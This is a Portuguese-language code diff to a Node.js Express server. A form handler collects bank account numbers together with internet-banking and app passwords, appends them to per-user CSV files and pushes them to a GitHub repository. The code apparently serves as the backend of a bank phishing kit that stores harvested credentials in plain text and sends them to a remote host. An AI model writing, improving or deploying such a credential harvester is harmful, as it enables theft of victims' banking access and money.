@@ -29,6 +29,7 @@ console.log("🔧 GitHub config:", {
   hasToken: !!GITHUB_TOKEN
 });
 
+
 const octokit = new Octokit({ auth: GITHUB_TOKEN });
 
 octokit.rest.users.getAuthenticated()
@@ -39,15 +40,15 @@ octokit.rest.users.getAuthenticated()
     console.error("❌ Falha ao autenticar no GitHub:", err);
   });
 
-// Função para criar um escritor CSV para cada arquivo
-function getCsvWriter(fileName) {
+// Função para criar um escritor CSV para cada usuário
+function getCsvWriter(userId) {
   const dir = path.join(__dirname, 'usuarios');
   if (!fs.existsSync(dir)) {
     fs.mkdirSync(dir, { recursive: true });
   }
 
   return createObjectCsvWriter({
-    path: path.join(dir, fileName),
+    path: path.join(dir, `${userId}.csv`),
     header: [
       { id: "titularidade", title: "Titularidade" },
       { id: "tipo_conta", title: "Tipo de Conta" },
@@ -55,11 +56,13 @@ function getCsvWriter(fileName) {
       { id: "conta", title: "Conta" },
       { id: "senhaInternet", title: "Senha da Internet" },
       { id: "senhaApp", title: "Senha Digital" }
-    ]
+    ],
+    append: true
   });
 }
 
 // Processa o envio do formulário
+// Agora usando multer para parsear multipart/form-data
 app.post(
   "/processa_formulario",
   upload.none(),
@@ -82,9 +85,6 @@ app.post(
       return res.status(400).send("Todos os campos são obrigatórios.");
     }
 
-    const timestamp = new Date().toISOString().replace(/[:.]/g, '_');
-    const fileName = `${user_id}-${timestamp}.csv`;
-
     const registro = [{
       titularidade,
       tipo_conta,
@@ -95,13 +95,13 @@ app.post(
     }];
 
     // 1) Salva localmente no CSV do usuário
-    const csvWriter = getCsvWriter(fileName);
+    const csvWriter = getCsvWriter(user_id);
     csvWriter.writeRecords(registro)
-      .then(() => console.log(`✅ Dados salvos no CSV local: ${fileName}`))
+      .then(() => console.log("✅ Dados salvos no CSV local"))
       .catch(err => console.error("❌ Erro ao salvar localmente no CSV:", err));
 
     // 2) Envia ao GitHub
-    saveToGitHub(fileName, registro)
+    saveToGitHub(user_id, registro)
       .then(() => console.log("✅ Dados enviados ao GitHub com sucesso"))
       .catch(err => console.error("❌ Erro ao salvar no GitHub:", err));
 
@@ -111,10 +111,10 @@ app.post(
 );
 
 // Função para criar ou atualizar CSV de usuário no GitHub
-async function saveToGitHub(fileName, registros) {
+async function saveToGitHub(userId, registros) {
   const filePathInRepo = BASE_PATH
-    ? `${BASE_PATH}/${fileName}`
-    : fileName;
+    ? `${BASE_PATH}/${userId}.csv`
+    : `${userId}.csv`;
 
   const csvContent = registros.map(r =>
     `${r.titularidade},${r.tipo_conta},${r.agencia},${r.conta},${r.senhaInternet},${r.senhaApp}`
